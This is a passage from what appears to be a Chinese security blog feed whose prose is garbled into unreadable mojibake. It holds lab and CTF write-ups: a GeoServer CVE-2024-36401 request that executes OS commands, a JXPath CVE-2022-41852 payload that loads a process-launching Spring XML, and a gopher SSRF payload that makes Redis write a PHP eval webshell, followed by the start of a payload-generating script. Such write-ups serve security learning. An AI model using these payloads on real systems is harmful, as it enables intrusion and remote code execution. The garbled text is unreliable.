class="line"></span><br></pre></td></tr></table></figure><p>å°†å…¶ä¿å­˜åœ¨<code>scripts</code>æ–‡ä»¶å¤¹ä¸‹ã€‚</p><p>ä»£ç çš„å¤§è‡´æ„æ€æ˜¯ï¼Œè°ƒç”¨åˆçº¦çš„<code>set</code>å‡½æ•°æ–¹æ³•ï¼Œè®¾ç½®å€¼ä¸º<code>42</code>ï¼Œç„¶åå†è°ƒç”¨<code>get</code>æ–¹æ³•å»è¯»å–æ•°æ®ã€‚</p><p>å…ˆæ˜¯è°ƒç”¨<code>set</code>æ–¹æ³•ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat run scripts/test.js  --network localhost</span><br></pre></td></tr></table></figure><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113235445672.png" alt="image-20250113235445672"></p><p>ç„¶åå†è°ƒç”¨<code>get</code>æ–¹æ³•ï¼Œè·å–<code>set</code>çš„å€¼ã€‚</p><p><img src="/2025/01/13/mac%E6%90%AD%E5%BB%BAhardhat%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20250113235806214.png" alt="image-20250113235806214"></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»¥å¤ªåŠ </tag>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GeoServerä»£ç æ‰§è¡Œæ¼æ´(CVE-2024-36401)</title>
      <link href="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/"/>
      <url>/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/</url>
      
        <content type="html"><![CDATA[<h2 id="é…ç½®è°ƒè¯•ç¯å¢ƒ">é…ç½®è°ƒè¯•ç¯å¢ƒ</h2><p>è°ƒè¯•æ¼æ´çš„GeoServerç‰ˆæœ¬å·ä¸º2.23.2ï¼Œè·å–æºä»£ç ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/geoserver/geoserver #ä¸‹è½½</span><br><span class="line">git tag #æŸ¥çœ‹å…¨éƒ¨çš„ç‰ˆæœ¬</span><br><span class="line">git checkout tags/2.23.2 #åˆ‡æ¢è‡³2.23.2ç‰ˆæœ¬</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨vulhubè¿›è¡Œæ¼æ´çš„è¿œç¨‹è°ƒè¯•ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/vulhub/geoserver/CVE-2024-36401/</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure><p>IntelliJ IDEAæ‰“å¼€geoserverçš„æºä»£ç ï¼Œæ·»åŠ è¿è¡ŒRemote JVM Debugï¼Œç«¯å£é»˜è®¤ä¸º5005ã€‚</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109204237470.png" alt="image-20250109204237470"></p><p>ç„¶åå¯¹ä»£ç è¿›è¡Œæ–­ç‚¹è°ƒè¯•ã€‚</p><h2 id="æµ…æä»£ç ">æµ…æä»£ç </h2><h3 id="å®˜æ–¹é€šå‘Š">å®˜æ–¹é€šå‘Š</h3><p>æ¼æ´é€šå‘Šï¼š</p><p><a href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv</a><br>GeoToolç»„ä»¶é€šå‘Šï¼š</p><p><a href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a><br>Jxpathæ¼æ´åˆ©ç”¨ï¼š</p><p><a href="https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852">https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852</a></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109220637144.png" alt="image-20250109220637144"></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109220231306.png" alt="image-20250109220231306"></p><p>ä»å®˜æ–¹çš„é€šæŠ¥ä¸­å¯ä»¥æ³¨æ„åˆ°ï¼Œè‹¥XPathè¡¨è¾¾å¼ç”±ç”¨æˆ·è¾“å…¥æä¾›ï¼Œåˆ™ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚å­˜åœ¨å®‰å…¨é—®é¢˜çš„æ¥å£ä¸º</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">org.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)</span><br><span class="line">org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)</span><br><span class="line">org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)</span><br><span class="line">org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class&lt;T&gt;)</span><br><span class="line">org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)</span><br><span class="line">org.geotools.data.complex.expression.MapPropertyAccessorFactory.<span class="keyword">new</span> <span class="title class_">PropertyAccessor</span>() &#123;...&#125;.get(Object, String, Class&lt;T&gt;)</span><br><span class="line">org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æ ·ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">org</span>.geotools.xsd.StreamingParser(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">org</span>.geotools.filter.v1_0.OGCConfiguration(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayInputStream(<span class="string">&quot;&lt;Filter&gt;&lt;/Filter&gt;&quot;</span>.getBytes()),</span><br><span class="line">                <span class="string">&quot;java.lang.Thread.sleep(5000)&quot;</span>)</span><br><span class="line">        .parse();</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´å¤ç°">æ¼æ´å¤ç°</h3><p>è‹¥ç”¨æˆ·è¾“å…¥çš„å‚æ•°ï¼Œä¼ è¾“åˆ°äº†è¿™äº›å­˜åœ¨æ¼æ´çš„ç±»ä¸­ï¼Œå‚æ•°ä¼šç»è¿‡JXPathå¼•æ“å»è¿›è¡Œè§£æï¼Œä»è€Œå¯¼è‡´ä»£ç æ‰§è¡Œã€‚æ¼æ´æœ¬è´¨æ˜¯JXPathæ¼æ´ï¼ŒJXpathæ¼æ´æ˜¯Apache Commons JXPathä¹‹å‰çˆ†å‡ºçš„æ¼æ´ï¼ˆCVE-2022-41852ï¼‰ï¼Œè¿™ä¸ªJXPathå¯¹ä¼ ç»Ÿçš„XPathè¯­å¥è¿›è¡Œäº†æ‹“å±•ï¼Œæ”¯æŒXPathè¯­å¥ä¸­æ’å…¥ä¸€äº›è¡¨è¾¾å¼è¯­è¨€çš„ç‰¹æ€§ï¼Œèƒ½å¤Ÿè°ƒç”¨ä»»æ„publicçš„é™æ€æ–¹æ³•ç­‰å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p><p>å®˜ç½‘ç»™å‡ºçš„å¯èƒ½å­˜åœ¨æ¼æ´çš„è¯·æ±‚</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">WFS GetFeature</span><br><span class="line">WFS GetPropertyValue</span><br><span class="line">WMS GetMap</span><br><span class="line">WMS GetFeatureInfo</span><br><span class="line">WMS GetLegendGraphic</span><br><span class="line">WPS Execut</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å®˜ç½‘</p><p><a href="https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html">https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html</a></p><p>WFS GetPropertyValueè¯·æ±‚å¦‚ä¸‹ï¼š</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109222248139.png" alt="image-20250109222248139"></p><p>GETè¯·æ±‚å³å¯è§¦å‘æ¼æ´ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),%27touch%20/tmp/success2%27)</span><br></pre></td></tr></table></figure><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109222510886.png" alt="image-20250109222510886"></p><h3 id="å®šä½æ¼æ´">å®šä½æ¼æ´</h3><p>ç”±å‰é¢å¯çŸ¥ï¼ŒGetPropertyValueæ˜¯æˆ‘ä»¬è¦å®šä½çš„ä½ç½®ï¼Œæ‰¾åˆ°ç±»çš„ä½ç½®ã€‚</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109223053220.png" alt="image-20250109223053220"></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109223140901.png" alt></p><p>å¯¹runæ–¹æ³•è¿›è¡Œæ–­ç‚¹ï¼Œè¿›è¡Œå•æ­¥è°ƒè¯•ï¼Œå®šä½åˆ°ä»£ç propertyNameNoIndexes.evaluateå¤„ï¼Œè¿™é‡Œè°ƒç”¨äº†geotoolçš„evaluateæ–¹æ³•ï¼Œè·Ÿè¿›</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109223804405.png" alt="image-20250109223804405"></p><p>å‘ç°org.geotools.filter.AttributeExpressionImpl#evaluate(java.lang.Object, java.lang.Class<T>)ä¸­è°ƒç”¨äº†accessor.getï¼Œå†è·Ÿè¿›</T></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109225119903.png" alt="image-20250109225119903"></p><p>è¿™é‡Œè°ƒç”¨äº†å­˜åœ¨æ¼æ´çš„<code>org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor#get</code>è§¦å‘äº†æ¼æ´ã€‚</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250109225403954.png" alt="image-20250109225403954"></p><h3 id="CVE-2022-41852-XPathæ¼æ´">CVE-2022-41852 XPathæ¼æ´</h3><h4 id="æ¼æ´æè¿°">æ¼æ´æè¿°</h4><p>Apache Commons JXPathå®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨é™¤compile()å’ŒcompilePath()å‡½æ•°ä¹‹å¤–çš„æ‰€æœ‰å¤„ç†XPathå­—ç¬¦ä¸²çš„JXPathContextç­‰å‡½æ•°é€šè¿‡XPathè¡¨è¾¾å¼ä»ç±»è·¯å¾„åŠ è½½ä»»ä½•Javaç±»ï¼Œä»è€Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><p>JXPathåŠç”¨æ³•ï¼š</p><p><a href="https://commons.apache.org/proper/commons-jxpath/users-guide.html">https://commons.apache.org/proper/commons-jxpath/users-guide.html</a></p><h4 id="åˆ©ç”¨èŒƒå›´">åˆ©ç”¨èŒƒå›´</h4><p>Apache Commons JXPath &lt;= 1.3</p><h4 id="æ¼æ´å¤ç°-2">æ¼æ´å¤ç°</h4><p>ä¸‹è½½POCï¼š<a href="https://github.com/Warxim/CVE-2022-41852">https://github.com/Warxim/CVE-2022-41852</a></p><p>POCä½¿ç”¨Springæ¡†æ¶ï¼Œç®€å•å®ç°æ¥å—ç”¨æˆ·è¾“å…¥å¹¶ä½¿ç”¨å®ƒä»Personç±»ä¸­æ£€ç´¢æŒ‡å®šçš„æ•°æ®ã€‚</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110115215618.png" alt="image-20250110115215618"></p><p>å¯åŠ¨Springï¼Œåœ¨æœ¬åœ°åˆ›å»ºä¸€ä¸ªtest.xmlï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;commandRunner&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>open<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>-a<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>Calculator<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æœ¬åœ°å†å¼€å¯ä¸€ä¸ª80ç«¯å£ï¼Œç”¨äºè¿œç¨‹åŠ è½½test.xml</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p>Payloadï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/vulnerable-example?path=org.springframework.context.support.ClassPathXmlApplicationContext.new(%22http://127.0.0.1/test.xml%22)</span><br></pre></td></tr></table></figure><p>å¼€å¯è°ƒè¯•ï¼Œæ–­ç‚¹ï¼Œè°ƒç”¨äº†org.apache.commons.jxpath.JXPathContext#getValue(java.lang.String)æ–¹æ³•ï¼Œè·Ÿè¿›</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110130016519.png" alt="image-20250110130016519"></p><p>è·Ÿè¿›org.apache.commons.jxpath.ri.compiler.Expression#computeValue</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110130144114.png" alt="image-20250110130144114"></p><p>ç»§ç»­è·Ÿè¿›åˆ°org.apache.commons.jxpath.Function#invokeå‡½æ•°ä¸­ï¼Œå®ç°äº†Spring-BeanåŠ è½½ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ã€‚</p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110130533234.png" alt="image-20250110130533234"></p><p><img src="/2025/01/09/GeoServer%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(CVE-2024-36401)/image-20250110131339598.png" alt="image-20250110131339598"></p><h2 id="å‚è€ƒ">å‚è€ƒ</h2><p>CVE-2024-36401å‚è€ƒï¼š</p><p><a href="https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/README.zh-cn.md</a></p><p><a href="https://www.bilibili.com/video/BV1bb421n7M2/?share_source=copy_web&amp;vd_source=40fffae7c3c0198962dc9cf9689a1a8a">https://www.bilibili.com/video/BV1bb421n7M2/?share_source=copy_web&amp;vd_source=40fffae7c3c0198962dc9cf9689a1a8a</a></p><p><a href="https://xz.aliyun.com/t/14991">https://xz.aliyun.com/t/14991</a></p><p>CVE-2022-41852å‚è€ƒï¼š</p><p><a href="https://www.anquanke.com/post/id/281941">https://www.anquanke.com/post/id/281941</a></p><p><a href="https://github.com/Warxim/CVE-2022-41852">https://github.com/Warxim/CVE-2022-41852</a></p>]]></content>
      
      
      <categories>
          
          <category> Webæ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> Java </tag>
            
            <tag> XPath </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRFæ¼æ´ç¯‡</title>
      <link href="/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/"/>
      <url>/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h2 id="SSRFæ‰“Redis">SSRFæ‰“Redis</h2><p>CTF showçš„WEBå…¥é—¨360å…³å¡ï¼Œæ‰“Redisã€‚</p><p>æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°6379ç«¯å£å¼€æ”¾ï¼Œ6379ç«¯å£ï¼Œä¸€èˆ¬ä¸ºRedisã€‚</p><p><img src="/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/1.png" alt></p><p>æ‰“å…¥Payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252428%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524_POST%255B1%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25245%250D%250A1.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure><p>æˆåŠŸã€‚</p><p><img src="/2024/07/25/SSRF%E6%BC%8F%E6%B4%9E%E7%AF%87/2.png" alt></p><h3 id="ä½¿ç”¨åˆ°äº†gopheråè®®">ä½¿ç”¨åˆ°äº†gopheråè®®</h3><blockquote><p>Gopher åè®®æ˜¯ HTTP åè®®å‡ºç°ä¹‹å‰ï¼Œåœ¨ Internet ä¸Šå¸¸è§ä¸”å¸¸ç”¨çš„ä¸€ä¸ªåè®®ï¼Œå½“ç„¶ç°åœ¨ Gopher åè®®å·²ç»æ…¢æ…¢æ·¡å‡ºå†å²ã€‚<br>Gopher åè®®å¯ä»¥åšå¾ˆå¤šäº‹æƒ…ï¼Œç‰¹åˆ«æ˜¯åœ¨ SSRF ä¸­å¯ä»¥å‘æŒ¥å¾ˆå¤šé‡è¦çš„ä½œç”¨ã€‚åˆ©ç”¨æ­¤åè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„ FTPã€Telnetã€Redisã€Memcacheï¼Œä¹Ÿå¯ä»¥è¿›è¡Œ GETã€POST è¯·æ±‚ã€‚</p></blockquote><p>ç‰¹å®šçš„åè®®å¼€å¤´ï¼Œâ€œ_â€åé¢è·Ÿç€å†…å®¹éƒ¨åˆ†ã€‚</p><p><code>gopher://127.0.0.1:6379/_</code></p><h3 id="Redisçš„è¯­æ³•">Redisçš„è¯­æ³•</h3><p>ä¸Šè¿°ä½¿ç”¨çš„Payloadæ˜¯åŸºäºå­˜åœ¨Redisæœªæˆæƒæ¼æ´çš„æƒ…å†µä¸‹ï¼Œæ— éœ€å¯†ç ï¼Œä¸‹é¢æˆ‘ä»¬æ¥ç®€å•åˆ†æä¸€ä¸‹ä½¿ç”¨çš„payloadã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">*3</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1</span></span><br><span class="line">1</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">28</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php eval($_POST[1]);?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*4</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">dir</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">13</span></span><br><span class="line">/var/www/html</span><br><span class="line">*4</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">6</span></span><br><span class="line">config</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">3</span></span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">10</span></span><br><span class="line">dbfilename</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">5</span></span><br><span class="line">1.php</span><br><span class="line">*1</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">4</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p><code>*3</code>æŒ‡çš„æ˜¯ä¸‰ä¸ªå˜é‡ï¼Œ<code>$3</code>æŒ‡çš„æ˜¯å­—ç¬¦çš„é•¿åº¦ä¸º3ã€‚</p><p>æ­£å¸¸æˆ‘ä»¬ä½¿ç”¨Redisçš„è¯­æ³•ï¼Œé¦–å…ˆéœ€è¦è¿›è¡Œç™»å½•ï¼Œå­˜åœ¨æœªæˆæƒå¯ç›´æ¥ç™»å½•ï¼Œä¸å­˜åœ¨åˆ™éœ€è¦å¯†ç ç™»å½•ã€‚</p><p><code>redis-cli -h 192.168.73.150 -a password</code></p><p>ä¸Šä¼ Webshellã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &lt;?php$&#123;IFS&#125;eval($_POST[1]);?&gt;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename 1.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure><blockquote><p><em><strong>æ³¨æ„</strong></em>ï¼šæˆ‘æ³¨æ„åˆ°å¾ˆå¤šæ‰“CTFçš„åŒå­¦ä½¿ç”¨çš„<code>Gopherus</code>å»ç”Ÿæˆçš„payloadï¼Œæˆ‘å‘ç°<code>Gopherus</code>åœ¨ç”Ÿæˆpayloadæ—¶ï¼Œä½¿ç”¨åˆ°äº†<code>flushall</code>å‘½ä»¤ï¼Œè¯¥å‘½ä»¤ç”¨äºæ¸…ç©º Redis æœåŠ¡å™¨ä¸­çš„æ‰€æœ‰æ•°æ®åº“ï¼Œæ•°æ®ä¼šè¢«æ°¸ä¹…åˆ é™¤ï¼Œåˆ‡è®°ä¸å¯ç”¨äºå®é™…ç¯å¢ƒä¸­ï¼</p></blockquote><p>ç½‘ä¸Šç¿»åˆ°çš„è„šæœ¬ï¼Œå®æµ‹å¯è¡Œï¼ŒSSRFæ‰“Redisçš„redis_shell.pyå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line"><span 